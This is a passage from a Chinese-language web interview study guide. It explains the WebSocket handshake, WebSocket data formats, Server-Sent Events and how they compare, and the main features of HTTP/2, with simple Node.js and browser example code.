WebSocket是在应用层实现的协议。尽管WebSocket的握手过程使用了HTTP协议，但一旦握手成功，WebSocket连接会升级为全双工的通信通道，不再遵循HTTP协议的规则。在握手成功后，WebSocket协议会在应用层上定义消息格式和通信规则，通过TCP协议在传输层上进行数据传输。​

因此，WebSocket是在应用层实现的协议，它建立在传输层的TCP协议之上，使用HTTP协议进行握手，然后在建立的TCP连接上实现全双工的通信。在应用层上，WebSocket定义了一种标准的消息格式和通信规则，使得客户端和服务器可以通过发送和接收WebSocket消息来进行实时的双向通信。​

**客户端**：

```js
// 创建WebSocket对象，指定服务器的URL​
const socket = new WebSocket("ws://localhost:8080");​
​
// 连接建立时触发​
socket.onopen = function(event) {​
  console.log("WebSocket连接已建立");​
  ​
  // 发送消息给服务器​
  socket.send("Hello, Server!");​
};​
​
// 接收到服务器发送的消息时触发​
socket.onmessage = function(event) {​
  console.log("收到服务器的消息: " + event.data);​
};​
​
// 连接关闭时触发​
socket.onclose = function(event) {​
  console.log("WebSocket连接已关闭");​
};
```

**服务端**：

```js
const WebSocket = require('ws');​
​
// 创建WebSocket服务器​
const wss = new WebSocket.Server({ port: 8080 });​
​
// 监听连接事件​
wss.on('connection', function connection(ws) {​
  console.log('WebSocket连接已建立');​
​
  // 监听消息事件​
  ws.on('message', function incoming(message) {​
    console.log('收到客户端的消息: %s', message);​
​
    // 发送消息给客户端​
    ws.send('Hello, Client!');​
  });​
​
  // 监听关闭事件​
  ws.on('close', function close() {​
    console.log('WebSocket连接已关闭');​
  });​
});
```

## 问题32：WebSocket 建立连接的过程​

1. **客户端发起 HTTP 握手请求**：客户端首先向服务器发起一个标准的 HTTP 请求，这个请求包含了一些特定的头部，用于请求建立 WebSocket 连接。
​
```http
GET /chat HTTP/1.1​
Host: server.example.com​
Upgrade: websocket​
Connection: Upgrade​
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==​
Sec-WebSocket-Version: 13
```

- `GET /chat HTTP/1.1`: 请求的路径和协议版本。​
- `Host`: server.example.com：服务器的主机名。​
- `Upgrade`: websocket：表示请求协议升级到 WebSocket。​
- `Connection`: Upgrade：表示希望升级连接。​
- `Sec-WebSocket-Key`: Base64 编码的随机密钥，服务器用于生成响应中的Sec-WebSocket-Accept 。​
- `Sec-WebSocket-Version`: WebSocket 协议版本，当前版本是 13。​
​
2。 **服务器响应 HTTP 握手请求**：如果服务器支持 WebSocket 并同意升级连接，则会返回一个 101 Switching Protocols 状态码的响应，表示协议切换成功。

```http
HTTP/1.1 101 Switching Protocols​
Upgrade: websocket​
Connection: Upgrade​
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

`101 Switching Protocols`：状态码表示协议切换。​
`Upgrade`：确认升级到 WebSocket 协议。​
`Connection`：确认连接升级。​
`Sec-WebSocket-Accept`：服务器基于客户端提供的 Sec-WebSocket-Key 计算得到值，保证握手安全。

3.**WebSocket 连接建立​**

在服务器响应成功后，客户端和服务器之间的 HTTP 连接就升级为 WebSocket 连接，从此可以进行全双工的实时通信。此时，HTTP 头部已经不再使用，取而代之的是 WebSocket 数据帧。​
​
4.**连接关闭**

WebSocket 连接可以由客户端或服务器任意一方关闭。关闭连接时，发送一个控制帧表示关闭请求，连接将以有序的方式关闭。

## 问题33：Websocket 支持传输的数据格式

1. **文本数据 (Text Data)**： UTF-8 编码的字符串形式传输的。

```js
const socket = new WebSocket('wss://example.com/socket');​
​
// 连接打开时发送文本消息​
socket.onopen = () => {​
  socket.send('Hello, Server!');​
};​
​
// 接收文本消息​
socket.onmessage = (event) => {​
  console.log('Received:', event.data);​
};
```

2. **二进制数据 (Binary Data)**：二进制数据可以有多种形式，包括 ArrayBuffer 和 Blob（在浏览器环境中）。可用于传输复杂的二进制数据，如文件、图像、音视频等。

```js
const socket = new WebSocket('wss://example.com/socket');​
​
// 连接打开时发送二进制消息​
socket.onopen = () => {​
  const buffer = new ArrayBuffer(8);const view = new Uint8Array(buffer);​
  view[0] = 255; // 示例数据​
  socket.send(buffer);​
};​
​
// 接收二进制消息​
socket.onmessage = (event) => {​
  if (event.data instanceof ArrayBuffer) {​
    const view = new Uint8Array(event.data);​
    console.log('Received binary data:', view);​
  }
```

## 问题34：Server-Sent Events (SSE) ​

服务器向浏览器推送实时更新数据的技术。通过使用标准 HTTP 协议和一个持久的连接将事件数据从服务器发送到客户端。适用于需要在客户端实时显示来自服务器的更新信息的应用场景，如实时通知、新闻推送、股票价格更新等。​
​
**主要特点**：​

1. **单向通信**：服务器可以向客户端推送数据，但客户端不能通过同一连接发送数据回服务器。​
2. **基于 HTTP**：SSE 使用 HTTP 协议​
3. **自动重连**：如果连接断开，浏览器会自动尝试重新连接​
​

**工作原理**​

1. **服务器端**：服务器通过 HTTP 响应头 Content-Type: text/event-stream 明确这是一个事件流。​
2. **客户端**：客户端创建一个 EventSource 对象，监听来自服务器的事件，并根据接收到的数据更新 UI。​

​
**适用场景**​

1. **实时通知**：如聊天消息、系统通知等。​
2. **实时更新**：如新闻推送、股票价格更新等。​
3. **数据监控**：如服务器状态监控、日志实时显示等。

## 问题35：Server-Sent Events (SSE)  示例代码​

**服务端代码**：

```js
const http = require('http');​
​
http.createServer((req, res) => {​
  res.writeHead(200, {​
    'Content-Type': 'text/event-stream',​
    'Cache-Control': 'no-cache',​
    'Connection': 'keep-alive',​
  });​
  ​
  // 发送事件数据​
  setInterval(() => {​
    res.write(`data: ${new Date().toLocaleTimeString()}\n\n`);​
  }, 1000);​
}).listen(8080, () => {​
  console.log('Server is running on http://localhost:8080');​
});
```

**客户端代码**：

```html
<!DOCTYPE html>​
<html lang="en">​
  <meta name="viewport" content="width=device-width, initial-scale=1.0">​
  <title>SSE Example</title>​
</head>​
<body>​
  <button id="start">Start SSE</button>​
  <button id="stop">Stop SSE</button>​
  <div id="messages"></div>​
​
  <script>​
    let eventSource;​
​
    document.getElementById('start').addEventListener('click', () => {​
      eventSource = new EventSource("http://localhost:8080");​
​
      eventSource.onmessage = (event) => {​
        console.log("Data from server:", event.data);​
        document.getElementById('messages').innerHTML += `<p>${event.data}</p>`;​
      };​
​
      eventSource.onopen = () => {​
        console.log("Connection opened");​
      };​
​
      eventSource.onerror = (error) => {​
        console.error("Error occurred:", error);​
      };​
    });​
​
    document.getElementById('stop').addEventListener('click', () => {​
      if (eventSource) {​
        eventSource.close();​
        console.log("Connection closed");​
      }​
    });​
  </script>​
</body>​
</html>
```

## 问题36：SSE 与 websocket 区别

**Server-Sent Events (SSE)**：

1. **单向通信** ：SSE 是单向通信，服务器可以推送数据到客户端，但客户端不能通过同一个连接发送数据到服务器。​
2. **协议** ：SSE 使用的是 HTTP 协议，特别是 HTTP/1.1 的事件流 (EventStream) 格式。​
3. **连接保持** ：SSE 也保持一个持久化的连接，但它是基于 HTTP 协议的，适合需要从服务器向客户端推送实时更新的应用，如新闻推送、实时股票价格等。​
4. **数据格式** ：SSE 只能发送文本数据，且是以事件流的形式发送。​
5. **简单性** ：SSE 的实现较为简单，只需要服务器不断发送事件数据到客户端。​
​
**WebSocket：**​

1. **双向通信** ：WebSocket 允许双向通信。客户端和服务器都可以随时发送数据，而不需要客户端发起请求。​
2. **协议** ：WebSocket 是一个独立的协议，从 HTTP 协议开始，但一旦连接建立，就切换到 WebSocket 协议。​
3. **连接保持** ：WebSocket 建立的是一个持久化的连接，适合需要频繁交换数据的应用，如在线聊天、实时游戏等。​
4. **数据格式** ：WebSocket 可以发送任意格式的数据（文本或二进制）。​
5. **复杂度** ：WebSocket 的实现相对复杂，需要处理连接的建立、保持和关闭等过程。

**选型**：

- SSE 更适合单向数据流、需要实时更新的场景，如实时通知系统、社交媒体更新、新闻推送等。​
- WebSocket 更适合需要双向通信、高频率数据交换的场景，如实时聊天应用、多人在线游戏等。

## 问题37：http2.0 

- **多路复用（Multiplexing）**：HTTP/2允许在单个连接上同时发送多个请求和响应，而不需要等待一个请求的响应才能发送下一个请求。这显著提高了数据传输的效率，减少了延迟，尤其对于复杂的网页来说效果明显。​
- **头部压缩（Header Compression）**：HTTP/2使用了HPACK算法对HTTP头部进行压缩，减少了头部信息传输的开销。这有助于减少数据传输量，尤其是在移动网络和高延迟网络上。​
- **服务器推送（Server Push）**：HTTP/2允许服务器在客户端请求之前主动将资源推送给客户端。这可以提前发送可能需要的资源，减少了客户端请求的往返次数，从而改善了性能。​
- **二进制协议**：HTTP/2采用了二进制协议，与HTTP/1.1的文本协议不同。这使得协议的解析更加高效，因为计算机更容易处理二进制数据。​
- **流控制（Flow Control）**：HTTP/2引入了流控制机制，可以防止一个流的数据拥塞整个连接，确保各个流能够公平竞争连接的带宽。​
- **优先级（Priority）**：HTTP/2允许请求和响应设置优先级，以确保关键资源优先加载。​
- **安全性**：虽然HTTP/2本身并不要求使用加密，但现实中绝大多数HTTP/2连接都是通过TLS/SSL加密的，以提供更高的安全性。